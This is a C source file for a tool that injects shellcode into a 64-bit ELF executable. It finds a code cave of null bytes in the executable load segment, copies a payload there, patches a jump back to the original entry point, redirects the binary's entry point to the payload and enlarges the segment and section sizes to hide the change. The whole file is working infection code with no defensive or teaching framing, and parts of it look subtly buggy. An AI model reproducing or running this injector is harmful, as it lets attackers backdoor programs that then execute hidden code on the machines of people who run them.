#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <elf.h>
#include <sys/mman.h>

char SUCCESS[]="0", OPEN_ERROR[]="1", NOT_SUFFICIENT_CAVE_FOUND[]="2", MMAP_ERROR[]="3", OTHER_ERROR[]="4";

int main (int argc, char *argv[]) {
//    printf("start\n");

	if (argc != 3) {
		fprintf(stderr, "[!] Usage: %s <target> <payload>\n", argv[0]);
		exit(1);
	}

//    printf("open and map target file\n");
	int 		t_fd, t_size;
	struct 		stat _info; 
	void		*t_addr;

	// open target file
	if ((t_fd = open(argv[1], O_APPEND | O_RDWR, 0)) < 0) {
//		printf("[!] open:");
        printf(OPEN_ERROR);
		exit(1);	
	}		
    
	// get target file disk size
  	fstat (t_fd, &_info);
  	t_size = _info.st_size;

	// map target file to memory
	if ((t_addr = mmap(0, t_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, t_fd, 0)) == MAP_FAILED) {
//		printf("[!] mmap:");
        printf(MMAP_ERROR);
		exit(1);
	}

//    printf("get target file info\n");
//    printf("t_addr = %x\n", t_addr);
	Elf64_Ehdr	*t_ehdr;

	// get ELF header
	t_ehdr = (Elf64_Ehdr *) t_addr;


//	 open payload file

	int		p_fd, p_size;
	void		*p_addr;

	// open payload file
	if ((p_fd = open(argv[2], O_APPEND | O_RDWR, 0)) < 0) {
//		printf("[!] open:");
        printf(OPEN_ERROR);
        exit(1);
	}

	// get payload file disk size
  	fstat (p_fd, &_info);
  	p_size = _info.st_size;

	// map payload file to memory
	if ((p_addr = mmap(0, p_size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, p_fd, 0)) == MAP_FAILED) {
//		printf("[!] mmap:");
        printf(MMAP_ERROR);
        exit(1);
	}


	int		i, sc_size = p_size;


//  find code cave

//	find executable load segment

//    printf("find executable load segment\n");
	int		seg_size = 0;
	Elf64_Phdr 	*t_phdr;
    int num = t_ehdr->e_phnum;
//    printf("t_ehdr->e_phnum = %x\n", num);


    // get first program header
	t_phdr = (Elf64_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);
//    printf("t_phdr = %d\n", t_phdr);

	// find executable load segment
	for (i = 0; i < t_ehdr->e_phnum; i++) {
		if (t_phdr->p_type == PT_LOAD && t_phdr->p_flags & 0x11) {
			break;
		}
		t_phdr = (Elf64_Phdr *) ((unsigned char*) t_phdr + (unsigned int) t_ehdr->e_phentsize);
	}

	// get segment size

//    printf("seg_size = %x\n", seg_size);
//    printf("t_phdr->p_filesz = %x\n", t_phdr->p_filesz);
//    printf("t_phdr->p_align = %x\n", t_phdr->p_align);

    while (seg_size < t_phdr->p_filesz) {
//        printf("seg_size = %d\n", seg_size);
        seg_size += t_phdr->p_align;
	}

//	find code cave
//    printf("find code cave\n");
	int		cc_offset, count = 0;
	void 		*t_seg_ptr = t_addr + t_phdr->p_offset;

	for (i = 0; i < seg_size; i++) {
		if (*(char *)t_seg_ptr == 0x00) {	// if null byte
			if (count == 0) {		// if first null byte, set codecave address to ptr
				cc_offset = t_phdr->p_offset + i;
			}
			count++;
			if (count == sc_size) {
				break;
			}
		}
		else {
			count = 0;
		}
		t_seg_ptr++;
	}

	if (count == 0) {
//		fprintf(stderr, "[!] codecave: no sufficiently large codecave found\n");
        printf(NOT_SUFFICIENT_CAVE_FOUND);
        exit(1);
	}

//	inject shellcode into code cave
//    printf("inject shellcode into code cave\n");
	// get address of payload
    void *sc_addr = p_addr;
	// copy payload to code cave
//    printf("cc_offset = %d\n", cc_offset);
//    printf("t_ehdr->e_entry = %d\n", t_ehdr->e_entry);

    Elf64_Addr cur_pos = t_addr + cc_offset;
	memmove(cur_pos, sc_addr, sc_size);
    cur_pos += sc_size;
    char jmp[] = {0x0F, 0x84};
    memmove(cur_pos, jmp, 2);
    cur_pos += 2;

    int bytes_to_oep = (t_ehdr->e_entry - cc_offset - sc_size - 2);
    char hex[8];
    for (int i=0; i<8; i++) {
        hex[i] = '0';
    }
//    sprintf(hex, "%x", bytes_to_oep);
//    puts(hex);


    unsigned char bytes[4];

    bytes[0] = (bytes_to_oep >> 24) & 0xFF;
    bytes[1] = (bytes_to_oep >> 16) & 0xFF;
    bytes[2] = (bytes_to_oep >> 8) & 0xFF;
    bytes[3] = bytes_to_oep & 0xFF;
//    printf("%x %x %x %x\n", (unsigned char)bytes[0],
//           (unsigned char)bytes[1],
//           (unsigned char)bytes[2],
//           (unsigned char)bytes[3]);

    for (int j = 3; j >=0; j--) {
        memmove(cur_pos, &bytes[j], 1);
        cur_pos++;
    }
    char NOP = 0x90;
    memmove(cur_pos, &NOP, 1);
//    printf("bytes_to_oep = %d\n", bytes_to_oep);


//	set entry point to payload
//    printf("set entry point to payload\n");
	Elf64_Addr	*base;
	Elf64_Phdr 	*t_phdr2 = (Elf64_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);

	for (i = 0; i < t_ehdr->e_phnum; i++) {
		if (t_phdr2->p_type == PT_LOAD) {
			base = (Elf64_Addr *)t_phdr2->p_vaddr;
			break;
		}
		t_phdr2 = (Elf64_Phdr *) ((unsigned char *) t_phdr2 + (unsigned int) t_ehdr->e_phentsize);
	}
//    printf("base = %d\n", base);

    // replace entry point with address of payload
	t_ehdr->e_entry = (unsigned int) base + cc_offset;


//	augment executable segment
//    printf("augment executable segment\n");
	t_phdr->p_memsz += sc_size + 7;

//	augment relevent section

	Elf64_Shdr 	*t_shdr = t_addr + t_ehdr->e_shoff;

	for (i = 0; i < t_ehdr->e_shnum - 1; i++) {
		if (t_shdr[i].sh_offset < cc_offset && t_shdr[i + 1].sh_offset > cc_offset) {
			t_shdr[i].sh_size += sc_size + 7;
		}
	}

	close(t_fd);
	close(p_fd);

    printf(SUCCESS);
	exit(0);
}
